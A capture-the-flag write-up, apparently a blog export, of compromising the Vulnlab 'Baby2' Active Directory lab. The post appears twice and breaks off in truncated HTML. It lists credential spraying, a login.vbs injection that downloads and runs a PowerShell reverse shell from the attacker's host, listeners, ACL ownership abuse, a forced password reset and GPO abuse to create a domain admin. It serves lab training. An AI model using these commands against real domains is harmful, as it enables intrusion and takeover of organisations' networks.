doesn't seem to be anything noteworthy here, however let's check to see if any other users from our user list have any login scripts present - we'll start with `Amelia.Griffiths`.\n\n![](/images/vulnlab/baby2-vl/d.jpg)\n\nWe can see here that this user does have a login script enabled, which points to the same `login.vbs` file within the `SYSVOL` share that we saw earlier. Now that we have this information, the attack path is relatively clear. All that we need to do is modify this file to include a reverse shell and wait for any users to login (that have the same properties as Amelia Griffiths, or Amelia Griffiths themself).\n\nIn a red-team environment, we would just need to wait for the user log-in. This would just require some patience and could take a day or two, whenever the user next attempts to access their workstation. However since we're in a lab, I'm assuming that there's a scheduled task or automated login that logs a user in after a short period of time.\n\nSo let's modify the script. I've included to resources below, a simple PowerShell reverse shell within a text file and a line of text that will trigger this reverse shell within `login.vbs`\n\n```\nCreateObject(\"WScript.Shell\").Run \"powershell -ep bypass -w hidden IEX (New-Object System.Net.Webclient).DownloadString('http://10.8.0.173:9001/revshell.txt')\"\n```\n\nYou can add this anywhere in the `login.vbs` script, I just opted to do it before the SMB shares are mapped at the bottom of the file.\n\nNext, we'll make sure that the PowerShell reverse shell that I've generated is within the same directory that we'll be hosting, remember that it's name is `revshell.txt` and the LPORT for it is `9002`, which will point to a netcat listener.\n\n```\n$LHOST = \"10.8.0.173\"; $LPORT = 9002; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = [...snip...]$StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()\n```\n\nYou can generate a similar one from [revshells.com](https://www.revshells.com/), that's essentially all you'll need.\n\nSo now all that's left to do is to delete the existing `login.vbs` script is `SYSVOL` and add our modified script to it.\n\nWe'll also stand up two listeners, one being a Python HTTP server and another being a netcat listener.\n`python3 -m http.server 9001`\n`nc -lvnp 9002`\n\n`smbclient -c 'cd \\baby2.vl\\scripts\\; rm login.vbs; put login.vbs' \\\\\\\\10.10.102.12\\\\SYSVOL -U 'library'`\n\nAfter about a minute or two of waiting, we can see that our file was grabbed by the remote machine from our webserver.\n`10.10.102.12 - - [21/May/2024 14:16:02] \"GET /revshell.txt HTTP/1.1\" 200 -`\n\nAnd we can also see that our reverse shell was executed, and we now have a shell as `amelia.griffiths`.\n\n![](/images/vulnlab/baby2-vl/e.jpg)\n\n# Host Reconnaissance\n\nThe user flag was not in it's ordinary location, which usually is `C:\\Users\\(user)\\Desktop\\user.txt`, however I found that it was just within the root `C:\\` drive denoted as `C:\\users.txt`. This means we have conquered the first half of the machine!\n\nFrom here I decided to stand up a Sliver server and ran an implant so I could get an easier shell, since the shell that we landed with is very barebones. I've done this before in a few of my other writeups - essentially all I'm doing is starting a listener, generate an implant, and running the implant on the remote machine to receive a session. You can find all the documentation needed to do the above steps [here](https://github.com/BishopFox/sliver).\n\nSo from here we'll need to move around the domain using our permissions. I couldn't find specifically anything that `Amelia.Griffiths` could do from Bloodhound, nor did their permissions seem to be out of the ordinary.\n\nHowever you'll notice that if you run `whoami /all` with our user, you'll find that they are a part of two groups that are not regularly enabled by default.\n\n```\nBABY2\\office    Group            S-1-5-21-213243958-1766259620-4276976267-1104 Mandatory group, Enabled by default, Enabled group\nBABY2\\legacy    Group            S-1-5-21-213243958-1766259620-4276976267-2601 Mandatory group, Enabled by default, Enabled group\n```\n\nWe can look at both the groups in Bloodhound to see if they have any abnormally configured outbound object controls. The office group didn't seem to have anything out of the ordinary, however the focal point for our attack path seems to rely on two of the outbound object controls that the `legacy` group has.\n\n![](/images/vulnlab/baby2-vl/f.jpg)\n\n# GPO Object Control\n\nIt seems that `Amelia.Griffiths` (who is within the `legacy` group) has `WriteOwner` on both the GPO-Management OU and the `gpoadm` user. To give context on how this works, `WriteOwner` essentially allows our user to modify the ownership of the object. If we can change the ownership of this object, then we can make the owner of it ourselves. And from there, our ability to abuse the GPOs can allow us to add a new DA of our choosing.\n\nFurthermore, we can see that the `gpoadm` user has GenericAll on two GPOs that we can use to create said DAs.\n\n![](/images/vulnlab/baby2-vl/g.jpg)\n\nNot only that, but if we verify who the `gpoadm` account belongs to by running the below command, we can see that it is controlled by the Domain Admins group.\n\n```\nPS C:\\Users\\amelia.griffiths\\Desktop> Get-ADUser gpoadm | ForEach-Object {Get-ACL \"AD:\\$($_.DistinguishedName)\" | Select-Object -ExpandProperty Owner}\n\nBABY2\\Domain Admins\n```\n\nSo to start, let's use `PowerView` to change the owner of the `gpoadm` user to `Amelia.Griffiths` using a built-in cmdlet.\n`PS C:\\Users\\amelia.griffiths\\Desktop> Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths`\n\nIf we run the above `Get-ADUser` command that we ran earlier, we can see that the owner of the `gpoadm` account has been changed.\n\n```\nPS C:\\Users\\amelia.griffiths\\Desktop> Get-ADUser gpoadm | ForEach-Object {Get-ACL \"AD:\\$($_.DistinguishedName)\" | Select-Object -ExpandProperty Owner}\n\nBABY2\\Amelia.Griffiths\n```\n\nAfterwards, we can then add a new ruleset, or ACL, to the `gpoadm` user to give ourselves GenericAll on the account.\n`PS C:\\Users\\amelia.griffiths\\Desktop> Add-DomainObjectACL -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All`\n\nThis in theory should now allow for us to do a multitude of different attacks, most notably changing the users password. While I normally wouldn't do this in a red-team environment, this should be alright since we're in a lab.\n\nThat being said, if you do want a little pointer on what you could do that could help keep a low-profile, make sure to check out xct's writeup on this machine [here](https://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab) (timestamp is 9:08). He utilizes Whisker and Rubeus to create a TGT that essentially acts like a backdoor, allowing you to create shadow credentials that you can use to always be able to log into the box. This can continue to work even if the user changes their password and does NOT change the user's password.\n\nNot only that, you can also use the dumped hash that Rubeus will provide in PTH (Pass-the-Hash).\n\nWe could reupload a new Bloodhound dump, but I already know that we have GenericAll on this user. We'd normally be able to use `bloodyAD` to change the user's passwords, but that requires us to have valid credentials to `Amelia.Griffiths`, which we don't have.\n\nLuckily enough there is a Window alternative that we can do within our shell as `Amelia.Griffiths`.\n\n```\nPS C:\\Users\\amelia.griffiths\\Desktop> $newcred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n\nPS C:\\Users\\amelia.griffiths\\Desktop> Set-DomainUserPassword gpoadm -AccountPassword $cred\n```\n\nThere was no error output, thus we can confirm that the user password for `gpoadm` has been successfully changed. We can verify this in crackmapexec, but to prevent clutter on the writeup I'll just show a quick screenshot of it.\n\n![](/images/vulnlab/baby2-vl/h.jpg)\n\n# GPO Abuse as gpoadm\n\nNow, we should be able to abuse either of the two GPOs that `gpoadm` has control over. We can verify these two GPOs that we saw in our Bloodhound output by running the `Get-GPO` cmdlet in `PowerView`.\n`PS C:\\Users\\amelia.griffiths\\Desktop> Get-GPO -all`\n\nThis should return both GPOs that we saw previously, the `Default Domain Policy` and the `Default Domain Controllers Policy`.\nIt doesn't really matter which one we try to abuse, so I'll use the `Default Domain Controllers Policy`.\n\nWe can use `pyGPOAbuse` to essentially automate the exploitation of this GPO. What this tool will do is modify the GPO to create a scheduled task and execute a respective command that will give us a DA to authenticate as. https://github.com/Hackndo/pyGPOAbuse\n\nBy default, `pyGPOAbuse` will create a user under the context of `john:H4x00r123..`, we can also opt to specify a command to be more silent however this is all we'll probably need for this lab.\n`python3 pyGPOAbuse/pygpoabuse.py -dc-ip 10.10.104.215 -gpo-id \"6ac1786c-016f-11d2-945f-00c04fb984f9\" baby2.vl/gpoadm:'Password123!'`\n\nThis should create the scheduled task, which will potentially take a while to run.\nWe can circumvent this by forcing the GPO service to restart by running `gpupdate /force`.\n\nNow we can test our credentials that the GPO abuse created for us, being `john:H4x00r123..`\n`crackmapexec winrm 10.10.104.215 -u 'john' -p 'H4x00r123..'`\n\n![](/images/vulnlab/baby2-vl/i.jpg)\n\nThus, if we log into the WinRM service using `evil-winrm`, we should be able to authenticate properly.\n`evil-winrm -i 10.10.104.215 -u 'john' -p 'H4x00r123..'`\n\n![](/images/vulnlab/baby2-vl/j.jpg)\n\nWe can now see that we DA privileges since we have all of the permissions listed within `whoami /priv`.\nThis allows us to read the contents of the Administrator directory and read the root flag, meaning we have completed this machine!\n\nThe root flag is within `C:\\Users\\Administrator\\Desktop\\root.txt`.\n\n# Conclusion\n\nI plan on also making a research post about GPO abuse and getting into the nitty gritties of how to exploit it manually rather than doing it through `pyGPOAbuse`, which from what I'm expecting will probably be through `RPCClient`. Though I could be wrong. Nonetheless again, big thanks to xct for creating this machine - it definitely helped with a lot of practice and hopefully this writeup did the same for any readers.\n\n# Resources\n\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.revshells.com/\nhttps://github.com/BishopFox/sliver\nhttps://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab\nhttps://github.com/Hackndo/pyGPOAbuse","source":"_posts/baby2.md","raw":"---\ntitle: Baby2 - Vulnlab\ndate: 2024-06-05 16:06:39\ntags: [vulnlab, Medium]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.\ncover: /images/vulnlab/baby2-vl/baby2_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.\n\n# Enumeration\n\nLet's start with a general NMAP scan of the machine.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 21:04 EDT\nNmap scan report for 10.10.102.12\nHost is up (0.11s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n3389/tcp  open  ms-wbt-server\n57294/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 19.46 seconds\n```\n\nI also did a bit of more in-depth scans into the different ports with `-A` and found the DNS name for the machine denoted as `dc.baby2.vl`.\n\nThis box seems to have similar ports to the original `Baby` machine, which was an Easy machine that I've done before. Since there isn't a webserver, let's see if there's anything we can find initially with SMB.\n`smbclient -L 10.10.102.12 -N`\n\nThis will enumerate all of the SMB shares if we can see them by authenticating with null credentials.\n\n```\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tapps            Disk      \n\tC$              Disk      Default share\n\tdocs            Disk      \n\thomes           Disk      \n\tIPC$            IPC       Remote IPC\n\tNETLOGON        Disk      Logon server share \n\tSYSVOL          Disk      Logon server share\n```\n\nYou'll see that there are around three shares that are not usually on here - being `apps`, `docs`, and `homes`. This is inherently already a vulnerability, as I should not be allowed to view these shares by default with null credentials. Let's take a look into the `homes` directory to start, as the way it sounds this could be the home directories of a few users.\n`smbclient \\\\\\\\10.10.102.12\\\\homes -N`\n\nIn the directory that we land in, you'll find a list of users and (what we can assume) are their home directories. This is great because we already now have a wordlist to test around with LDAP.\n\n```\nsmb: \\> ls\n  .                                   D        0  Sat Sep  2 10:45:25 2023\n  ..                                  D        0  Tue Aug 22 16:10:21 2023\n  Amelia.Griffiths                    D        0  Tue Aug 22 16:17:06 2023\n  Carl.Moore                          D        0  Tue Aug 22 16:17:06 2023\n  Harry.Shaw                          D        0  Tue Aug 22 16:17:06 2023\n  Joan.Jennings                       D        0  Tue Aug 22 16:17:06 2023\n  Joel.Hurst                          D        0  Tue Aug 22 16:17:06 2023\n  Kieran.Mitchell                     D        0  Tue Aug 22 16:17:06 2023\n  library                             D        0  Tue Aug 22 16:22:47 2023\n  Lynda.Bailey                        D        0  Tue Aug 22 16:17:06 2023\n  Mohammed.Harris                     D        0  Tue Aug 22 16:17:06 2023\n  Nicola.Lamb                         D        0  Tue Aug 22 16:17:06 2023\n  Ryan.Jenkins                        D        0  Tue Aug 22 16:17:06 2023\n\n\t\t6126847 blocks of size 4096. 2005567 blocks available\n```\n\nI made a one-liner that should take all of these usernames from the SMB session and convert it into a list of usernames.\n`smbclient -c 'ls' \\\\\\\\10.10.102.12\\\\homes -N | awk '{print $1}' | grep [A-Za-z] > ul.txt`\n\nWith our list of usernames, let's test to see if any of these users are vulnerable to Kerberoasting or ASREPRoasting. We'll try and use the `Guest` user with no credentials since we don't currently have any valid passwords.\n`impacket-GetNPUsers -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt -request -no-pass BABY2/'Guest'`\n`impacket-GetUserSPNs -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt BABY2/'Guest' -no-pass`\n\nUnfortunately, neither seem to produce any valid results.\n\n# Credential Reusage\n\nAnother test that I learned how to do in one of the previous HTB machines that I practiced against is testing for username/password reusage - which is essentially just seeing if users are using their username as their password. This is generally the case when testing OT infrastructure, however let's give it a try here.\n\nWe can use crackmapexec for the feature along with the user list that we already have. I also added another one-liner for ease-of-use.\n`for user in $(cat ul.txt); do crackmapexec smb 10.10.102.12 -u $user -p $(echo $user | tr '[:upper:]' '[:lower:]'); done`\n\nThe format that the above command references will return any valid credentials with credential reusage, ex: 'Amelia.Griffiths:amelia.griffiths'.\n\n```\nSMB         10.10.102.12    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)\nSMB         10.10.102.12    445    DC               [+] baby2.vl\\library:library\n```\n\nThis confirms that the `library` user is using the same string for both their username and password.\n\nNow that we have credentials, let's see if we can access any of the other SMB shares such as `docs` or `apps`. We'll try `apps` first just to be sure.\n\n`smbclient \\\\\\\\10.10.102.12\\\\apps -U 'library'`\nThere seems to be a folder in this share denoted as `dev`, we'll access it with `cd dev`\n\n```\nsmb: \\dev\\> ls\n  .                                   D        0  Thu Sep  7 15:13:50 2023\n  ..                                  D        0  Thu Sep  7 15:12:59 2023\n  CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023\n  login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023\n\n\t\t6126847 blocks of size 4096. 2003374 blocks available\n```\n\nLet's grab both of these with `mget *` to see what they have. I'm not as interested in the CHANGELOG, more so in the VBS shortcut.\n\n# Logon Script Exploitation\n\nUpon opening the `login.vbs.lnk` shortcut on our local machine, we can see that most of the file is encrypted, however there are some valid strings that point us to another share.\n`\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs`\n\nWe also find the SID of the domain `S-1-5-21-213243958-1766259620-4276976267`\n\nLet's access the file and see if there's anything we can find.\n`smbclient \\\\\\\\10.10.102.12\\\\SYSVOL -U 'library'`\n\nThe `login.vbs` file is within `\\baby2.vl\\scripts\\`.\n\n```\nSub MapNetworkShare(sharePath, driveLetter)\n    Dim objNetwork\n    Set objNetwork = CreateObject(\"WScript.Network\")    \n  \n    [...snip...]\n    \n    Set objNetwork = Nothing\nEnd Sub\n\nMapNetworkShare \"\\\\dc.baby2.vl\\apps\", \"V\"\nMapNetworkShare \"\\\\dc.baby2.vl\\docs\", \"L\"\n```\n\nThis script looks to be mapping the network drives within the SMB instance, at least from first glance. You can see at the end that the SMB shares `apps` and `docs` are being mapped to `V` and `L` respectively. If this script is a login script that is ran when a user logs in, then we can potentially alter this to give us a reverse shell on the users machine once they log in.\n\nHowever what we know now is not enough to justify this, so let's check to see if bloodhound supports our thought process. I'll link the same bloodhound materials that I normally use for domain object enumeration.\n[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)\n[https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)\n\nWe'll run the python ingestor to dump the LDAP instance and all of its domain objects to a compressed zip archive.\n`python3 BloodHound.py/bloodhound.py -d 'baby2.vl' -u 'library' -p 'library' -c all -ns 10.10.102.12 --zip`\n\nOnce we receive the archive, we can upload it to Bloodhound using the `Upload Data` function.\n\nLet's look at our `library` user node to see if there are any login scripts that might correspond with the same `login.vbs` file that we saw prior.\n\n![](/images/vulnlab/baby2-vl/c.jpg)\n\nThere doesn't seem to be anything noteworthy here, however let's check to see if any other users from our user list have any login scripts present - we'll start with `Amelia.Griffiths`.\n\n![](/images/vulnlab/baby2-vl/d.jpg)\n\nWe can see here that this user does have a login script enabled, which points to the same `login.vbs` file within the `SYSVOL` share that we saw earlier. Now that we have this information, the attack path is relatively clear. All that we need to do is modify this file to include a reverse shell and wait for any users to login (that have the same properties as Amelia Griffiths, or Amelia Griffiths themself).\n\nIn a red-team environment, we would just need to wait for the user log-in. This would just require some patience and could take a day or two, whenever the user next attempts to access their workstation. However since we're in a lab, I'm assuming that there's a scheduled task or automated login that logs a user in after a short period of time.\n\nSo let's modify the script. I've included to resources below, a simple PowerShell reverse shell within a text file and a line of text that will trigger this reverse shell within `login.vbs`\n\n```\nCreateObject(\"WScript.Shell\").Run \"powershell -ep bypass -w hidden IEX (New-Object System.Net.Webclient).DownloadString('http://10.8.0.173:9001/revshell.txt')\"\n```\n\nYou can add this anywhere in the `login.vbs` script, I just opted to do it before the SMB shares are mapped at the bottom of the file.\n\nNext, we'll make sure that the PowerShell reverse shell that I've generated is within the same directory that we'll be hosting, remember that it's name is `revshell.txt` and the LPORT for it is `9002`, which will point to a netcat listener.\n\n```\n$LHOST = \"10.8.0.173\"; $LPORT = 9002; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = [...snip...]$StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()\n```\n\nYou can generate a similar one from [revshells.com](https://www.revshells.com/), that's essentially all you'll need.\n\nSo now all that's left to do is to delete the existing `login.vbs` script is `SYSVOL` and add our modified script to it.\n\nWe'll also stand up two listeners, one being a Python HTTP server and another being a netcat listener.\n`python3 -m http.server 9001`\n`nc -lvnp 9002`\n\n`smbclient -c 'cd \\baby2.vl\\scripts\\; rm login.vbs; put login.vbs' \\\\\\\\10.10.102.12\\\\SYSVOL -U 'library'`\n\nAfter about a minute or two of waiting, we can see that our file was grabbed by the remote machine from our webserver.\n`10.10.102.12 - - [21/May/2024 14:16:02] \"GET /revshell.txt HTTP/1.1\" 200 -`\n\nAnd we can also see that our reverse shell was executed, and we now have a shell as `amelia.griffiths`.\n\n![](/images/vulnlab/baby2-vl/e.jpg)\n\n# Host Reconnaissance\n\nThe user flag was not in it's ordinary location, which usually is `C:\\Users\\(user)\\Desktop\\user.txt`, however I found that it was just within the root `C:\\` drive denoted as `C:\\users.txt`. This means we have conquered the first half of the machine!\n\nFrom here I decided to stand up a Sliver server and ran an implant so I could get an easier shell, since the shell that we landed with is very barebones. I've done this before in a few of my other writeups - essentially all I'm doing is starting a listener, generate an implant, and running the implant on the remote machine to receive a session. You can find all the documentation needed to do the above steps [here](https://github.com/BishopFox/sliver).\n\nSo from here we'll need to move around the domain using our permissions. I couldn't find specifically anything that `Amelia.Griffiths` could do from Bloodhound, nor did their permissions seem to be out of the ordinary.\n\nHowever you'll notice that if you run `whoami /all` with our user, you'll find that they are a part of two groups that are not regularly enabled by default.\n\n```\nBABY2\\office    Group            S-1-5-21-213243958-1766259620-4276976267-1104 Mandatory group, Enabled by default, Enabled group\nBABY2\\legacy    Group            S-1-5-21-213243958-1766259620-4276976267-2601 Mandatory group, Enabled by default, Enabled group\n```\n\nWe can look at both the groups in Bloodhound to see if they have any abnormally configured outbound object controls. The office group didn't seem to have anything out of the ordinary, however the focal point for our attack path seems to rely on two of the outbound object controls that the `legacy` group has.\n\n![](/images/vulnlab/baby2-vl/f.jpg)\n\n# GPO Object Control\n\nIt seems that `Amelia.Griffiths` (who is within the `legacy` group) has `WriteOwner` on both the GPO-Management OU and the `gpoadm` user. To give context on how this works, `WriteOwner` essentially allows our user to modify the ownership of the object. If we can change the ownership of this object, then we can make the owner of it ourselves. And from there, our ability to abuse the GPOs can allow us to add a new DA of our choosing.\n\nFurthermore, we can see that the `gpoadm` user has GenericAll on two GPOs that we can use to create said DAs.\n\n![](/images/vulnlab/baby2-vl/g.jpg)\n\nNot only that, but if we verify who the `gpoadm` account belongs to by running the below command, we can see that it is controlled by the Domain Admins group.\n\n```\nPS C:\\Users\\amelia.griffiths\\Desktop> Get-ADUser gpoadm | ForEach-Object {Get-ACL \"AD:\\$($_.DistinguishedName)\" | Select-Object -ExpandProperty Owner}\n\nBABY2\\Domain Admins\n```\n\nSo to start, let's use `PowerView` to change the owner of the `gpoadm` user to `Amelia.Griffiths` using a built-in cmdlet.\n`PS C:\\Users\\amelia.griffiths\\Desktop> Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths`\n\nIf we run the above `Get-ADUser` command that we ran earlier, we can see that the owner of the `gpoadm` account has been changed.\n\n```\nPS C:\\Users\\amelia.griffiths\\Desktop> Get-ADUser gpoadm | ForEach-Object {Get-ACL \"AD:\\$($_.DistinguishedName)\" | Select-Object -ExpandProperty Owner}\n\nBABY2\\Amelia.Griffiths\n```\n\nAfterwards, we can then add a new ruleset, or ACL, to the `gpoadm` user to give ourselves GenericAll on the account.\n`PS C:\\Users\\amelia.griffiths\\Desktop> Add-DomainObjectACL -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All`\n\nThis in theory should now allow for us to do a multitude of different attacks, most notably changing the users password. While I normally wouldn't do this in a red-team environment, this should be alright since we're in a lab.\n\nThat being said, if you do want a little pointer on what you could do that could help keep a low-profile, make sure to check out xct's writeup on this machine [here](https://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab) (timestamp is 9:08). He utilizes Whisker and Rubeus to create a TGT that essentially acts like a backdoor, allowing you to create shadow credentials that you can use to always be able to log into the box. This can continue to work even if the user changes their password and does NOT change the user's password.\n\nNot only that, you can also use the dumped hash that Rubeus will provide in PTH (Pass-the-Hash).\n\nWe could reupload a new Bloodhound dump, but I already know that we have GenericAll on this user. We'd normally be able to use `bloodyAD` to change the user's passwords, but that requires us to have valid credentials to `Amelia.Griffiths`, which we don't have.\n\nLuckily enough there is a Window alternative that we can do within our shell as `Amelia.Griffiths`.\n\n```\nPS C:\\Users\\amelia.griffiths\\Desktop> $newcred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n\nPS C:\\Users\\amelia.griffiths\\Desktop> Set-DomainUserPassword gpoadm -AccountPassword $cred\n```\n\nThere was no error output, thus we can confirm that the user password for `gpoadm` has been successfully changed. We can verify this in crackmapexec, but to prevent clutter on the writeup I'll just show a quick screenshot of it.\n\n![](/images/vulnlab/baby2-vl/h.jpg)\n\n# GPO Abuse as gpoadm\n\nNow, we should be able to abuse either of the two GPOs that `gpoadm` has control over. We can verify these two GPOs that we saw in our Bloodhound output by running the `Get-GPO` cmdlet in `PowerView`.\n`PS C:\\Users\\amelia.griffiths\\Desktop> Get-GPO -all`\n\nThis should return both GPOs that we saw previously, the `Default Domain Policy` and the `Default Domain Controllers Policy`.\nIt doesn't really matter which one we try to abuse, so I'll use the `Default Domain Controllers Policy`.\n\nWe can use `pyGPOAbuse` to essentially automate the exploitation of this GPO. What this tool will do is modify the GPO to create a scheduled task and execute a respective command that will give us a DA to authenticate as. https://github.com/Hackndo/pyGPOAbuse\n\nBy default, `pyGPOAbuse` will create a user under the context of `john:H4x00r123..`, we can also opt to specify a command to be more silent however this is all we'll probably need for this lab.\n`python3 pyGPOAbuse/pygpoabuse.py -dc-ip 10.10.104.215 -gpo-id \"6ac1786c-016f-11d2-945f-00c04fb984f9\" baby2.vl/gpoadm:'Password123!'`\n\nThis should create the scheduled task, which will potentially take a while to run.\nWe can circumvent this by forcing the GPO service to restart by running `gpupdate /force`.\n\nNow we can test our credentials that the GPO abuse created for us, being `john:H4x00r123..`\n`crackmapexec winrm 10.10.104.215 -u 'john' -p 'H4x00r123..'`\n\n![](/images/vulnlab/baby2-vl/i.jpg)\n\nThus, if we log into the WinRM service using `evil-winrm`, we should be able to authenticate properly.\n`evil-winrm -i 10.10.104.215 -u 'john' -p 'H4x00r123..'`\n\n![](/images/vulnlab/baby2-vl/j.jpg)\n\nWe can now see that we DA privileges since we have all of the permissions listed within `whoami /priv`.\nThis allows us to read the contents of the Administrator directory and read the root flag, meaning we have completed this machine!\n\nThe root flag is within `C:\\Users\\Administrator\\Desktop\\root.txt`.\n\n# Conclusion\n\nI plan on also making a research post about GPO abuse and getting into the nitty gritties of how to exploit it manually rather than doing it through `pyGPOAbuse`, which from what I'm expecting will probably be through `RPCClient`. Though I could be wrong. Nonetheless again, big thanks to xct for creating this machine - it definitely helped with a lot of practice and hopefully this writeup did the same for any readers.\n\n# Resources\n\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.revshells.com/\nhttps://github.com/BishopFox/sliver\nhttps://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab\nhttps://github.com/Hackndo/pyGPOAbuse","slug":"baby2","published":1,"updated":"2024-06-05T20:26:24.599Z","_id":"clx29mygk0000g4ufep4t95ek","comments":1,"layout":"post","photos":[],"content":"<p>This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with a general NMAP scan of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 21:04 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.102.12</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 987 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT      STATE SERVICE</span><br><span class=\"line\">53/tcp    open  domain</span><br><span class=\"line\">88/tcp    open  kerberos-sec</span><br><span class=\"line\">135/tcp   open  msrpc</span><br><span class=\"line\">139/tcp   open  netbios-ssn</span><br><span class=\"line\">389/tcp   open  ldap</span><br><span class=\"line\">445/tcp   open  microsoft-ds</span><br><span class=\"line\">464/tcp   open  kpasswd5</span><br><span class=\"line\">593/tcp   open  http-rpc-epmap</span><br><span class=\"line\">636/tcp   open  ldapssl</span><br><span class=\"line\">3268/tcp  open  globalcatLDAP</span><br><span class=\"line\">3269/tcp  open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp  open  ms-wbt-server</span><br><span class=\"line\">57294/tcp open  unknown</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 19.46 seconds</span><br></pre></td></tr></table></figure>\n\n<p>I also did a bit of more in-depth scans into the different ports with <code>-A</code> and found the DNS name for the machine denoted as <code>dc.baby2.vl</code>.</p>\n<p>This box seems to have similar ports to the original <code>Baby</code> machine, which was an Easy machine that I’ve done before. Since there isn’t a webserver, let’s see if there’s anything we can find initially with SMB.<br><code>smbclient -L 10.10.102.12 -N</code></p>\n<p>This will enumerate all of the SMB shares if we can see them by authenticating with null credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">apps            Disk      </span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">docs            Disk      </span><br><span class=\"line\">homes           Disk      </span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">NETLOGON        Disk      Logon server share </span><br><span class=\"line\">SYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that there are around three shares that are not usually on here - being <code>apps</code>, <code>docs</code>, and <code>homes</code>. This is inherently already a vulnerability, as I should not be allowed to view these shares by default with null credentials. Let’s take a look into the <code>homes</code> directory to start, as the way it sounds this could be the home directories of a few users.<br><code>smbclient \\\\\\\\10.10.102.12\\\\homes -N</code></p>\n<p>In the directory that we land in, you’ll find a list of users and (what we can assume) are their home directories. This is great because we already now have a wordlist to test around with LDAP.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sat Sep  2 10:45:25 2023</span><br><span class=\"line\">  ..                                  D        0  Tue Aug 22 16:10:21 2023</span><br><span class=\"line\">  Amelia.Griffiths                    D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Carl.Moore                          D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Harry.Shaw                          D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Joan.Jennings                       D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Joel.Hurst                          D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Kieran.Mitchell                     D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  library                             D        0  Tue Aug 22 16:22:47 2023</span><br><span class=\"line\">  Lynda.Bailey                        D        0  Tue Aug 22 16:17:06 2023</span><br><span 